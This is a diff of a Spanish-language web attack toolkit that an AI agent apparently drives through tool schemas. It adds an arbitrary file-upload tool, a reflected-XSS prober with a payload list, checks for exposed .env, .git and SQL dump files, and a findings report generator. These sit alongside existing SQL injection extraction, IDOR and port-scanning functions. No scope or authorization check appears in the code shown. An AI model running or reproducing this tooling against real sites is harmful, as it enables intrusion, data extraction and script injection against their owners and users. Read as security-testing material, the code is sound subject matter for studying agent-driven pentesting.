@@ -153,6 +153,9 @@ def huella_web(url):
     base = f'{p.scheme}://{p.netloc}'
     robots, _ = _pedir(base + '/robots.txt')
     sectxt, _ = _pedir(base + '/.well-known/security.txt')
+    if faltan:
+        _anotar('Cabeceras de seguridad ausentes', 'baja', u, ', '.join(faltan))
+
     return {'ok': True, 'url_final': r.url, 'status': r.status_code,
             'servidor': cab.get('Server', ''), 'declarado': cab.get('X-Powered-By', ''),
             'tecnologias': _tec(t, cab), 'titulo': _titulo(t),
@@ -233,6 +236,10 @@ def enumerar_rutas(url, palabra=None, limite=250):
     with ThreadPoolExecutor(max_workers=MAX_HILOS) as ex:
         hall = [x for x in ex.map(uno, rutas) if x]
     hall.sort(key=lambda h: (h['status'] >= 500, h['status'] in (404, 403)))
+    for h in hall:
+        if h['ruta'] in ('.env', '.git/HEAD', '.git/config', 'backup.zip', 'backup.sql', 'db.sql', 'dump.sql'):
+            _anotar('Archivo expuesto: ' + h['ruta'], 'alta', u, 'accesible sin sesion', str(h['status']))
+
     return {'ok': True, 'probadas': len(rutas), 'halladas': hall[:70],
             'segundos': round(time.time() - t0, 1),
             'nota': 'Se descarto lo igual a una ruta inventada. 200 o 302 con contenido distinto = existe.'}
@@ -331,7 +338,7 @@ def probar_idor(url, desde=None, hasta=None):
 
 NOMBRES = ('huella_web', 'peticion_http', 'enumerar_rutas', 'analizar_js',
            'decodificar_jwt', 'probar_idor', 'escanear_puertos', 'ver_certificado',
-           'dns_registros', 'probar_sqli', 'abrir_sesion', 'verificar_sesion', 'extraer_sqli')
+           'dns_registros', 'probar_sqli', 'abrir_sesion', 'verificar_sesion', 'extraer_sqli', 'subir_archivo', 'probar_xss', 'reporte')
 
 def herramienta(nombre, args):
     a = args if isinstance(args, dict) else {}
@@ -367,6 +374,13 @@ def herramienta(nombre, args):
             return extraer_sqli(a.get('url'), a.get('parametro'), a.get('dbms'),
                                 a.get('que') or 'tablas', a.get('tabla') or '', a.get('columna') or '',
                                 a.get('desde') or 1, a.get('largo') or 12, a.get('metodo') or 'GET', a.get('cuerpo'))
+        if nombre == 'subir_archivo':
+            return subir_archivo(a.get('url'), a.get('campo'), a.get('nombre'),
+                                 a.get('contenido'), a.get('tipo'), a.get('campos_extra'))
+        if nombre == 'probar_xss':
+            return probar_xss(a.get('url'), a.get('parametro'), a.get('metodo'), a.get('cuerpo'))
+        if nombre == 'reporte':
+            return reporte(a.get('objetivo'))
     except Exception as e:
         print('[HACK]', e)
         return {'ok': False, 'error': 'fallo la herramienta: ' + str(e)[:150]}
@@ -417,6 +431,15 @@ HERRAMIENTAS = [
         'tabla': {'type': 'string'}, 'columna': {'type': 'string'},
         'desde': {'type': 'integer'}, 'largo': {'type': 'integer'}},
        ('url', 'parametro', 'dbms')),
+    _e('subir_archivo', 'Sube un archivo de prueba al objetivo (multipart).',
+       {'url': {'type': 'string'}, 'campo': {'type': 'string'}, 'nombre': {'type': 'string'},
+        'contenido': {'type': 'string'}, 'tipo': {'type': 'string'},
+        'campos_extra': {'type': 'string'}}, ('url', 'campo')),
+    _e('probar_xss', 'Prueba XSS reflejado en un parametro con varias cargas.',
+       {'url': {'type': 'string'}, 'parametro': {'type': 'string'},
+        'metodo': {'type': 'string'}, 'cuerpo': {'type': 'string'}}, ('url', 'parametro')),
+    _e('reporte', 'Arma el reporte markdown con todo lo hallado en esta sesion.',
+       {'objetivo': {'type': 'string'}}, ()),
 ]
 
 ERRORES_SQL = {
@@ -506,6 +529,9 @@ def probar_sqli(url, parametro, metodo='GET', cuerpo=None):
         res['detalle'] = 'no se confirmo inyeccion en ese parametro'
     else:
         res['detalle'] = res.get('detalle') or 'diferencia consistente entre condicion verdadera y falsa'
+    if res['vulnerable']:
+        _anotar('Inyeccion SQL', 'alta', u, res.get('detalle', ''), res.get('dbms', ''))
+
     res['nota'] = ('Confirmado: usa peticion_http para extraer datos (UNION SELECT o boolean a ciegas). '
                    'Si solo hay tiempo, es ciego y hay que extraer letra por letra.')
     return res
@@ -645,3 +671,89 @@ def extraer_sqli(url, parametro, dbms, que='tablas', tabla='', columna='',
             'desde': desde, 'largo_pedido': largo, 'texto': texto, 'corte': corte,
             'segundos': round(time.time() - t0, 1),
             'nota': 'Sigue con desde=%d para el siguiente tramo. Si sale vacio, prueba largo menor o revisa la condicion.' % (desde + len(texto))}
+
+def subir_archivo(url, campo, nombre, contenido, tipo='text/plain', campos_extra=None):
+    u = _norm(url)
+    if not u or not campo:
+        return {'ok': False, 'error': 'hacen faltan url y campo'}
+    extra = {}
+    for par in str(campos_extra or '').split(','):
+        if '=' in par:
+            k, v = par.split('=', 1)
+            extra[k.strip()] = v.strip()
+    archivos = {campo: (nombre or 'prueba.txt', (contenido or '').encode('utf-8'),
+                        tipo or 'text/plain')}
+    try:
+        r = _sesion().post(u, files=archivos, data=extra, timeout=TIMEOUT,
+                           allow_redirects=True, verify=False)
+    except Exception as e:
+        return {'ok': False, 'error': 'fallo la subida: ' + str(e)[:150]}
+    bajo = (r.text or '')[:5000].lower()
+    rechazo = any(p in bajo for p in PALABRAS_FALLO)
+    return {'ok': not rechazo, 'status': r.status_code, 'url_final': r.url,
+            'largo': len(r.content or b''), 'archivo': nombre, 'tipo': tipo,
+            'muestra': _recorte(r.text, 800),
+            'nota': ('Aceptado si no hay palabras de rechazo. Despues busca la URL publica del archivo '
+                     'y pide lo mismo sin sesion: si se abre sin login, es hallazgo.')}
+
+CARGAS_XSS = ('<script>alert(1)</script>', '"><svg/onload=alert(1)>',
+              "'><img src=x onerror=alert(1)>", 'javascript:alert(1)')
+
+def probar_xss(url, parametro, metodo='GET', cuerpo=None):
+    u = _norm(url)
+    if not u or not parametro:
+        return {'ok': False, 'error': 'hacen faltan url y parametro'}
+    m = 'POST' if str(metodo).upper() == 'POST' else 'GET'
+
+    def pedir(valor):
+        if m == 'POST':
+            return _pedir(u, 'POST', {'Content-Type': 'application/x-www-form-urlencoded'},
+                          _pon_cuerpo(cuerpo, parametro, quote(valor, safe='')))
+        return _pedir(_pon(u, parametro, quote(valor, safe='')))
+
+    crudo, sin_codificar, contextos = [], [], []
+    for carga in CARGAS_XSS:
+        r, e = pedir(carga)
+        if e or r is None:
+            continue
+        t = r.text or ''
+        if carga in t:
+            sin_codificar.append(carga)
+            i = t.find(carga)
+            contextos.append(re.sub(r'\s+', ' ', t[max(0, i - 60):i + 60]))
+        elif '&lt;script' in t.lower() or '&lt;svg' in t.lower():
+            crudo.append(carga)
+    if sin_codificar:
+        _anotar('XSS reflejado', 'media', u, 'parametro ' + parametro, sin_codificar[0])
+
+    return {'ok': True, 'url': u, 'parametro': parametro, 'metodo': m,
+            'reflejado_sin_codificar': sin_codificar, 'solo_codificado': crudo,
+            'contextos': contextos[:3],
+            'posible': bool(sin_codificar),
+            'nota': ('Sin codificar = probable XSS reflejado; confirma con un navegador. '
+                     'Solo codificado puede servir dentro de un atributo o en href.')}
+
+_HALL = {}
+SEVERIDAD = {'critica': 4, 'alta': 3, 'media': 2, 'baja': 1, 'info': 0}
+
+def _anotar(tipo, sev, url, detalle, evidencia=''):
+    _HALL.setdefault(_chat(), []).append(
+        {'tipo': tipo, 'severidad': sev, 'url': url, 'detalle': detalle,
+         'evidencia': _recorte(evidencia, 400)})
+
+def reporte(objetivo=''):
+    filas = _HALL.get(_chat(), [])
+    if not filas:
+        return {'ok': True, 'markdown': '# Reporte\n\nSin hallazgos registrados todavia.',
+                'total': 0}
+    filas = sorted(filas, key=lambda f: -SEVERIDAD.get(f['severidad'], 0))
+    out = ['# Reporte de pruebas', '', 'Objetivo: ' + (objetivo or 'no indicado'), '',
+           '## Hallazgos (%d)' % len(filas), '']
+    for n, f in enumerate(filas, 1):
+        out += [f'### {n}. {f["tipo"]} [{f["severidad"].upper()}]', '',
+                'URL: ' + f['url'], '', f['detalle'], '']
+        if f['evidencia']:
+            out += ['Evidencia:', '```', f['evidencia'], '```', '']
+    out += ['## Recomendacion general', '',
+            'Corregir de arriba a abajo: primero lo critico y alto.', '']
+    return {'ok': True, 'markdown': '\n'.join(out), 'total': len(filas)}
